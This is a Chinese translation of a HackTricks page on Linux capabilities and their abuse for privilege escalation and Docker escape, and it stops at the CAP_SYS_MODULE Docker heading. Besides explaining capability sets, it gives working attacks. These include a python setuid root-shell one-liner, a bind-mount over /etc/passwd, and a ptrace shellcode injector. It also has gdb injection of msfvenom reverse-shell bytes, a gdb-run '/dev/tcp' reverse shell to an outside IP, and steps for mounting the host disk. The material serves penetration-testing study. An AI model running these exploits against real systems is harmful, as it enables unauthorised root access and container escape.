# Linux 权限提升

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF 版本**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) 是西班牙最重要的网络安全活动之一，也是欧洲最重要的网络安全活动之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士的热点交流平台。

{% embed url="https://www.rootedcon.com/" %}

## 为什么使用权限提升？

Linux 权限提升将一部分可用的 root 权限提供给进程。这有效地将 root 权限分解为更小且独立的单元。然后可以将这些单元独立地授予进程。这样，完整的权限集合就减少了，降低了利用风险。

为了更好地理解 Linux 权限提升的工作原理，让我们首先看一下它试图解决的问题。

假设我们正在以普通用户身份运行一个进程。这意味着我们没有特权。我们只能访问由我们拥有、我们所在组拥有或标记为所有用户可访问的数据。在某个时刻，我们的进程需要更多的权限来完成其任务，比如打开一个网络套接字。问题是普通用户无法打开套接字，因为这需要 root 权限。

## 权限集合

**继承的权限**

**CapEff**：_有效_权限集表示进程当前正在使用的所有权限（这是内核用于权限检查的实际权限集合）。对于文件权限，有效集合实际上是一个单个位，指示在运行二进制文件时是否将允许集合的权限移动到有效集合中。这使得不具备能力意识的二进制文件可以使用文件权限而不需要发出特殊的系统调用。

**CapPrm**：(_允许的_) 这是线程可以添加到线程允许或线程可继承集合中的能力的超集。线程可以使用 capset() 系统调用来管理能力：它可以从任何集合中删除任何能力，但只能将其线程有效和继承集合中的能力添加到其线程允许集合中。因此，除非线程有效集合中具有 cap\_setpcap 能力，否则它无法将任何能力添加到其线程允许集合中。

**CapInh**：使用_继承_集合可以指定从父进程继承的所有能力。这样可以防止进程接收不需要的任何能力。此集合在 `execve` 之间保持不变，并且通常由接收能力的进程设置，而不是由分发能力给其子进程的进程设置。

**CapBnd**：使用_边界_集合，可以限制进程可能接收的能力。只有边界集合中存在的能力才允许在可继承和允许的集合中。

**CapAmb**：_环境_能力集适用于所有没有文件能力的非 SUID 二进制文件。它在调用 `execve` 时保留能力。然而，并非环境集合中的所有能力都可能被保留，因为如果它们在可继承或允许的能力集中不存在，则会被丢弃。此集合在 `execve` 调用之间保持不变。

有关线程和文件之间能力差异以及如何将能力传递给线程的详细解释，请阅读以下页面：

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## 进程和二进制文件的能力

### 进程的能力

要查看特定进程的能力，请使用 /proc 目录中的 **status** 文件。由于它提供了更多详细信息，让我们仅限于与 Linux 权限提升相关的信息。\
请注意，对于所有运行中的进程，能力信息是按线程维护的；对于文件系统中的二进制文件，它存储在扩展属性中。

您可以在 /usr/include/linux/capability.h 中找到定义的能力。

您可以在 `cat /proc/self/status` 中找到当前进程的能力，或者在 `/proc/<pid>/status` 中找到其他用户的能力。
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
这个命令在大多数系统上应该返回5行。

* CapInh = 继承的能力
* CapPrm = 允许的能力
* CapEff = 有效的能力
* CapBnd = 边界集
* CapAmb = 环境能力集
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
这些十六进制数字没有意义。使用capsh工具，我们可以将它们解码为能力名称。
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
现在让我们来检查一下 `ping` 使用的**能力**：
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
虽然那样做也可以，但还有另一种更简单的方法。要查看运行中进程的能力，只需使用**getpcaps**工具，后跟其进程ID（PID）。您还可以提供进程ID的列表。
```bash
getpcaps 1234
```
让我们在为二进制文件提供足够的权限（`cap_net_admin`和`cap_net_raw`）以便嗅探网络后，检查`tcpdump`的能力（_tcpdump正在进程9562中运行_）：
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
正如您所看到的，给定的能力与获取二进制文件能力的两种方式的结果相对应。\
_getpcaps_工具使用**capget()**系统调用来查询特定线程的可用能力。此系统调用只需要提供PID即可获取更多信息。

### 二进制文件的能力

二进制文件在执行时可以具有能力。例如，很常见的是找到具有`cap_net_raw`能力的`ping`二进制文件：
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
您可以使用以下命令**搜索具有特权的二进制文件**：
```bash
getcap -r / 2>/dev/null
```
### 使用capsh降低特权

如果我们使用capsh降低_ping_的CAP\_NET\_RAW特权，那么_ping_实用程序将不再起作用。
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
除了_capsh_本身的输出之外，_tcpdump_命令本身也应该引发错误。

> /bin/bash: /usr/sbin/tcpdump: 操作不允许

错误明确显示ping命令不允许打开ICMP套接字。现在我们可以确定这符合预期。

### 移除能力

您可以使用以下命令移除二进制文件的能力：
```bash
setcap -r </path/to/binary>
```
## 用户权限

显然，**也可以将权限分配给用户**。这可能意味着由用户执行的每个进程都可以使用用户的权限。\
根据[这个](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7)、[这个](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)和[这个](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)的信息，需要配置一些文件来为用户分配特定的权限，但是分配权限给每个用户的文件将是`/etc/security/capability.conf`。\
文件示例：
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## 环境能力

编译以下程序，可以在提供能力的环境中**生成一个 bash shell**。

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
在由编译的环境二进制文件执行的bash中，可以观察到新的能力（普通用户在"current"部分没有任何能力）。
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
您只能添加在允许集和继承集中都存在的功能。
{% endhint %}

### 有能力意识/无能力意识的二进制文件

**有能力意识的二进制文件不会使用环境提供的新功能**，然而**无能力意识的二进制文件会使用**它们，因为它们不会拒绝它们。这使得无能力意识的二进制文件在授予二进制文件功能的特殊环境中容易受到攻击。

## 服务功能

默认情况下，以root身份运行的服务将被分配所有功能，并且在某些情况下，这可能是危险的。\
因此，**服务配置**文件允许**指定**您希望其具有的**功能**，以及应该执行服务的**用户**，以避免以不必要的特权运行服务：
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker容器中的能力

默认情况下，Docker为容器分配了一些能力。通过运行以下命令，可以很容易地检查这些能力是哪些：
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) 是西班牙最重要的网络安全活动之一，也是欧洲最重要的网络安全活动之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士的热点聚会。

{% embed url="https://www.rootedcon.com/" %}

## 提权/容器逃逸

在执行特权操作后（例如设置chroot和绑定到套接字后），当你想要限制自己的进程时，能力是非常有用的。然而，通过传递恶意命令或参数，它们可以被利用并以root权限运行。

你可以使用`setcap`来强制程序使用能力，并使用`getcap`查询这些能力：
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` 表示你正在添加能力（“-”表示移除能力）作为有效和允许的。

要识别系统或文件夹中具有能力的程序：
```bash
getcap -r / 2>/dev/null
```
### 漏洞利用示例

在下面的示例中，发现二进制文件 `/usr/bin/python2.6` 存在提权漏洞：
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**`tcpdump`所需的权限**，以**允许任何用户嗅探数据包**：

```bash
# Set the necessary capabilities to tcpdump binary
sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

# Verify the capabilities
getcap /usr/sbin/tcpdump
```

**为tcpdump二进制文件设置必要的权限**
```bash
sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

# 验证权限
getcap /usr/sbin/tcpdump
```
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "空"能力的特殊情况

请注意，可以将空的能力集分配给程序文件，因此可以创建一个设置用户ID为root的程序，将执行该程序的进程的有效和保存的用户ID更改为0，但不向该进程授予任何能力。换句话说，如果你有一个二进制文件：

1. 不是由root拥有
2. 没有设置`SUID`/`SGID`位
3. 能力集为空（例如：`getcap myelf`返回`myelf =ep`）

那么**该二进制文件将以root身份运行**。

## CAP\_SYS\_ADMIN

[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 是一个大部分功能的综合能力，它很容易导致额外的能力或完全的root权限（通常可以访问所有能力）。在容器中执行特权操作时，很难从容器中删除`CAP_SYS_ADMIN`。对于模拟整个系统的容器来说，保留这个能力通常是必要的，而对于更具限制性的单个应用程序容器来说，这是不必要的。除其他外，这允许**挂载设备**或滥用**release_agent**以逃离容器。

**使用二进制文件的示例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
使用Python，您可以将修改后的_passwd_文件挂载到真实的_passwd_文件之上：
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
最后，在`/etc/passwd`上**挂载**修改后的`passwd`文件：
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
然后你将能够使用密码"password"以root身份执行**`su`**命令。

**环境示例（Docker越狱）**

你可以使用以下命令检查Docker容器中启用的能力：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在先前的输出中，您可以看到SYS_ADMIN功能已启用。

* **挂载**

这允许Docker容器**挂载主机磁盘并自由访问**：
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **完全访问权限**

在之前的方法中，我们成功访问了Docker主机的磁盘。\
如果你发现主机正在运行一个**ssh**服务器，你可以在Docker主机的磁盘上**创建一个用户**，然后通过SSH访问它：
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**这意味着您可以通过在主机上运行的某个进程中注入shellcode来逃逸容器。**要访问在主机上运行的进程，容器至少需要以**`--pid=host`**运行。

[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html)允许使用`ptrace(2)`和最近引入的跨内存附加系统调用，如`process_vm_readv(2)`和`process_vm_writev(2)`。如果授予了此权限并且`ptrace(2)`系统调用本身未被seccomp过滤器阻止，这将允许攻击者绕过其他seccomp限制，请参见[如果允许ptrace，则绕过seccomp的PoC](https://gist.github.com/thejh/8346f47e359adecd1d53)或**以下PoC**：

**使用二进制文件的示例（python）**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**使用二进制文件（gdb）的示例**

具有`ptrace`能力的`gdb`：
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
创建一个使用msfvenom生成的shellcode，通过gdb注入到内存中

```bash
# Generate the shellcode with msfvenom
msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<attacker_port> -f <format> -o shellcode.<extension>

# Start gdb and attach it to the target process
gdb -p <pid>

# Set a breakpoint at a suitable location
break <function>

# Run the target process
continue

# Once the breakpoint is hit, inject the shellcode into memory
call mmap(0, <shellcode_size>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)
call memcpy($rax, <shellcode_address>, <shellcode_size>)

# Modify the program counter to jump to the injected shellcode
set $rip = <shellcode_address>

# Continue the execution
continue
```

使用msfvenom生成shellcode，通过gdb注入到内存中的步骤如下：

```bash
# 使用msfvenom生成shellcode
msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<attacker_port> -f <format> -o shellcode.<extension>

# 启动gdb并附加到目标进程
gdb -p <pid>

# 在适当的位置设置断点
break <function>

# 运行目标进程
continue

# 当断点触发时，将shellcode注入到内存中
call mmap(0, <shellcode_size>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)
call memcpy($rax, <shellcode_address>, <shellcode_size>)

# 修改程序计数器以跳转到注入的shellcode
set $rip = <shellcode_address>

# 继续执行
continue
```
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
调试一个使用gdb生成的root进程，并复制粘贴之前生成的gdb命令行：
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**使用环境示例（Docker越狱）- 另一种GDB滥用**

如果已安装**GDB**（或者可以使用`apk add gdb`或`apt install gdb`进行安装），您可以从主机上**调试一个进程**并使其调用`system`函数。（此技术还需要`SYS_ADMIN`能力）**。**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
您将无法看到执行的命令的输出，但它将由该进程执行（因此获取一个反向shell）。

{% hint style="warning" %}
如果出现错误“当前上下文中没有符号“system””，请检查前面通过gdb将shellcode加载到程序中的示例。
{% endhint %}

**使用环境（Docker越狱）的示例 - Shellcode注入**

您可以使用以下命令检查Docker容器中启用的功能：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
列出在主机上运行的进程 `ps -eaf`

1. 获取架构 `uname -m`
2. 找到适用于该架构的 shellcode ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. 找到一个将 shellcode 注入到进程内存中的程序 ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. 修改程序中的 shellcode 并编译它 `gcc inject.c -o inject`
5. 注入并获取 shell：`./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

[**CAP\_SYS\_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程加载和卸载任意内核模块（`init_module(2)`、`finit_module(2)` 和 `delete_module(2)` 系统调用）。这可能导致简单的特权升级和 ring-0 损害。内核可以随意修改，从而破坏所有系统安全性、Linux 安全模块和容器系统。\
**这意味着您可以在主机机器的内核中插入/删除内核模块。**

**使用二进制文件的示例**

在下面的示例中，二进制文件 **`python`** 具有此能力。
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
默认情况下，**`modprobe`** 命令会在目录 **`/lib/modules/$(uname -r)`** 中检查依赖列表和映射文件。\
为了利用这一点，让我们创建一个假的 **lib/modules** 文件夹：
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
然后**编译内核模块，你可以在下面找到2个示例，并将其复制**到此文件夹中：
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
最后，执行所需的Python代码来加载此内核模块：
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**二进制文件示例**

在下面的示例中，二进制文件 **`kmod`** 具有这个能力。
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
这意味着可以使用命令**`insmod`**来插入内核模块。按照下面的示例来滥用这个特权获取**反向 shell**。

**使用环境示例（Docker 越狱）**

